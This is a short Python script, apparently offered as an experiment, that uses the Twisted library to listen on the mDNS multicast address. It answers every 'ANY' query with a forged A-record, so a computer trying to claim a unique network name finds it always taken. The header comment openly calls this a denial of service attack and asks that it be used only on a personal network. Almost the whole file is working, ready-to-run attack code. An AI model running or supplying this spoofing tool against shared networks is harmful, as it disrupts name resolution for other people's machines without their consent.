#!/usr/bin/env python

# This is a basic script that listens for "ANY" mDNS queries and responds back
# immediately with a made-up A-record.  This effectively results in an annoying
# denial of service attack against a computer trying to find a unique name for
# itself.  (Tested only with OS X)
#
# NOTE: This is a super obnoxious thing to do to other people, so please only
# use this for experimenting on your personal network.

from twisted.internet import reactor
from twisted.names import dns

# Reference: https://bazaar.launchpad.net/~oubiwann/txuls/tim-allen-twisted-mdns/view/head:/mDNS-0.7/mDNS.py

class MulticastDNSProtocol(dns.DNSDatagramProtocol):
    def __init__(self, *args, **kwargs):
        super(MulticastDNSProtocol, self).__init__(*args, **kwargs)

    def startProtocol(self):
        print "Joining multicast group..."
        self.transport.joinGroup(self.controller.address)
        super(MulticastDNSProtocol, self).startProtocol()
    
class MDNSHog(object):
    def __init__(self, address="224.0.0.251", port=5353):
        self.address = address
        self.port = port

        self.proto = MulticastDNSProtocol(self)

        reactor.listenMulticast(port, self.proto, listenMultiple=True)

    def messageReceived(self, m, proto, addr):
        if m.answer:
            return

        for q in m.queries:
            if q.type == dns.ANY and q.cls == dns.IN:
                name = q.name
                print "got broadcast ANY request for {!r}".format(str(name))
                reply = dns.Message(answer=True, auth=True, maxSize=1452)
                reply.answers = [dns.RRHeader(name.name, dns.A, dns.IN, 60, dns.Record_A("192.168.1.123", 60), True)]
                self.proto.writeMessage(reply, (self.address, self.port))
                print "sent back false claim because we're being rude"

if __name__ == "__main__":
    print "Creating hog..."
    h = MDNSHog()
    print "Listening..."
    reactor.run()
